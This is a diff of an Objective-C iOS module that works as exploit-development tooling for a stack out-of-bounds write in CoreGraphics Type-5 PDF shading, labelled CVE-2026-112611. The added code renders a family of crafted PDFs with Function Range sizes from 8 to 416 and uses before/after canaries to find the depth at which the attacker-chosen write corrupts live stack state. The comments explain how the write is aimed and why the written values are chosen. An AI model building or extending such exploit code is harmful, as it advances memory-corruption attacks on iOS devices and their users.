@@ -1,46 +1,48 @@
 #import <Foundation/Foundation.h>
 #import <UIKit/UIKit.h>
 #import <CoreGraphics/CoreGraphics.h>
-#import <CoreText/CoreText.h>
 #import "Modules.h"
 #import "AppDelegate.h"
 #import "Util.h"
 
 // ===========================================================================
 // CoreGraphics Type-5 (lattice-form Gouraud) shading OOB write — CVE-2026-112611
-// family, fixed only in iOS 27.2 (24B115).  Our build is 26.2b1, so the
-// parse-time gate (range_dim == nc && nc <= 4) does not exist here at all: the
-// whole /ShadingType 5 path is reachable with no guard.
+// family, fixed only in iOS 27.2 (24B115).  Our build is 26.2b1, and the
+// 27.2 parse-time gate (range_dim == nc && nc <= 4) does not exist here at all.
 //
 // At draw time _cg_shading_type5_draw builds a 72-byte mesh record per vertex
-// (color area at +0x20, room for nc components) and calls CGFunctionEvaluate,
+// (colour area at +0x20, room for nc components) and calls CGFunctionEvaluate,
 // which writes R doubles — R being the /Function's /Range dimension, chosen by
-// the PDF and unrelated to nc.  The record array is a STACK VLA, so with R > nc
-// the writes walk up the frame.  A Type-4 function makes the written doubles
-// arbitrary, so this is an attacker-chosen, arbitrary-depth stack write inside
-// our own process, triggered by painting the page.
+// the PDF and unrelated to nc.  The record array is a STACK VLA, so the writes
+// walk up the frame; the overflow length is exactly 8*R - 40 bytes.
 //
-// Oracle design: post a canary BEFORE the render and one AFTER.  If only the
-// first arrives, the write fired (the process is gone); if both arrive, the
-// render completed — which for the crash oracle means the site is not reachable
-// in this build.
+// Our shared cache has no symbols, so the frame cannot be measured by
+// disassembly — instead the AIM IS SWEPT: R is a pure PDF parameter, and the
+// family in Resources covers 8..416 (24..3288 bytes past the record).  Each
+// render posts a canary before and after; the first R whose "before" arrives
+// without an "after" is where the write reaches live frame state.  Every
+// written double is 1.0 = 0x3FF0000000000000, so any wild dereference lands on
+// a recognisable chosen address.
 // ===========================================================================
+
+// Renders one bundled PDF page into a small bitmap context.  Posts a canary
+// before and after the paint, so a process that never returns still leaves the
+// exact render it died in.
 static NSString *ModRenderPDF(NSString *pdfName, NSString *tag) {
-    NSString *path = [[NSBundle mainBundle].bundlePath stringByAppendingPathComponent:pdfName];
+    NSString *bundle = [NSBundle mainBundle].bundlePath;
+    NSString *path = [bundle stringByAppendingPathComponent:pdfName];
     if (![[NSFileManager defaultManager] fileExistsAtPath:path])
         return [NSString stringWithFormat:@"%@: %@ not in the bundle", tag, pdfName];
 
-    NSURL *url = [NSURL fileURLWithPath:path];
-    CFDataRef data = (CFDataRef)[NSData dataWithContentsOfURL:url];
-    if (!data) return [NSString stringWithFormat:@"%@: could not read %@", tag, pdfName];
-    CGDataProviderRef prov = CGDataProviderCreateWithCFData(data);
+    NSData *raw = [NSData dataWithContentsOfFile:path];
+    if (!raw.length) return [NSString stringWithFormat:@"%@: could not read %@", tag, pdfName];
+    CGDataProviderRef prov = CGDataProviderCreateWithCFData((CFDataRef)raw);
     CGPDFDocumentRef doc = CGPDFDocumentCreateWithProvider(prov);
     CGDataProviderRelease(prov);
     if (!doc || CGPDFDocumentGetNumberOfPages(doc) < 1) {
         if (doc) CGPDFDocumentRelease(doc);
         return [NSString stringWithFormat:@"%@: not a readable PDF (%@)", tag, pdfName];
     }
-    size_t pages = CGPDFDocumentGetNumberOfPages(doc);
 
     CGPDFPageRef page = CGPDFDocumentGetPage(doc, 1);
     CGRect box = CGPDFPageGetBoxRect(page, kCGPDFMediaBox);
@@ -55,30 +57,55 @@ static NSString *ModRenderPDF(NSString *pdfName, NSString *tag) {
         CGPDFDocumentRelease(doc);
         return [NSString stringWithFormat:@"%@: no bitmap context", tag];
     }
-    AveLog([NSString stringWithFormat:@"    %@: pages=%zu, canary BEFORE render of %@",
-           tag, (unsigned long)pages, pdfName]);
+
     AvePost([NSString stringWithFormat:@"%@ BEFORE render of %@", tag, pdfName]);
-    CGContextDrawPDFPage(ctx, page);      // <-- the write happens in this call
+    CGContextDrawPDFPage(ctx, page);          // <-- the write happens in this call
     CGContextRelease(ctx);
 
-    AveLog([NSString stringWithFormat:@"    %@: canary AFTER render (survived)", tag]);
     AvePost([NSString stringWithFormat:@"%@ canary AFTER render (survived)", tag]);
     CGPDFDocumentRelease(doc);
     return [NSString stringWithFormat:@"%@: render returned without a fault (%@)", tag, pdfName];
 }
 
 NSString *ModCGShadingOOB(void) {
-    AveLog(@"    CG Type-5 shading: CVE-2026-112611 OOB write (gate absent on 26.2b1)");
-    // control first: a benign, in-bounds shading must render cleanly.  If the
-    // CONTROL faults, the render path itself is the problem, not the bug.
+    AveLog(@"    CG Type-5 shading: CVE-2026-112611 stack OOB write, depth sweep");
+    AvePost(@"CG start");
+
+    // 1. control first: R == nc == 1 is in-bounds and must render cleanly.
     NSString *ctl = ModRenderPDF(@"control_shading_type5.pdf", @"CG-CTL");
-    AveLog([NSString stringWithFormat:@"    control: %@", ctl]);
     AvePost([NSString stringWithFormat:@"CGCTL %@", ctl]);
-    if ([ctl containsString:@"without a fault"]) {
-        NSString *r = ModRenderPDF(@"crash_shading_type5.pdf", @"CG-OOB");
-        AveLog([NSString stringWithFormat:@"    oracle: %@", r]);
-        AvePost([NSString stringWithFormat:@"CGOOB %@", r]);
-        return [NSString stringWithFormat:@"CG type-5: %@", r];
+    if (![ctl containsString:@"without a fault"]) {
+        AvePost([NSString stringWithFormat:@"CG verdict: CONTROL FAULTED (%@)", ctl]);
+        return [NSString stringWithFormat:@"CG type-5: CONTROL FAULTED (%@) - the render path "
+                @"itself is broken, not the bug", ctl];
     }
-    return [NSString stringWithFormat:@"CG type-5: CONTROL FAULTED (%@) - render path broken, not the bug", ctl];
+    AvePost(@"CGCTL in-bounds render OK, starting the R sweep");
+
+    // 2. the sweep: the bundled sht5_rNNN family in ascending order.
+    NSString *bundle = [NSBundle mainBundle].bundlePath;
+    NSError *err = nil;
+    NSArray *all = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:bundle error:&err];
+    NSMutableArray *fam = [NSMutableArray array];
+    for (NSString *f in all) {
+        if ([f hasPrefix:@"sht5_r"] && [f hasSuffix:@".pdf"]) [fam addObject:f];
+    }
+    [fam sortUsingSelector:@selector(compare:)];
+    if (!fam.count) {
+        AvePost(@"CG verdict: no sht5 family in the bundle");
+        return @"CG type-5: no R-family in the bundle";
+    }
+
+    NSString *last = nil;
+    for (NSString *f in fam) {
+        NSString *tag = [NSString stringWithFormat:@"CG-R%@",
+                         [f substringWithRange:NSMakeRange(6, 3)]];
+        last = ModRenderPDF(f, tag);
+        AvePost([NSString stringWithFormat:@"CGOOB %@", last]);
+        if (![last containsString:@"without a fault"])
+            return [NSString stringWithFormat:@"CG type-5: %@", last];
+    }
+    AvePost([NSString stringWithFormat:@"CG verdict: sweep done, every R returned (%lu PDFs)",
+            (unsigned long)fam.count]);
+    return [NSString stringWithFormat:@"CG type-5: sweep of %lu depths all returned without a "
+            @"fault — the write is not reaching live state", (unsigned long)fam.count];
 }
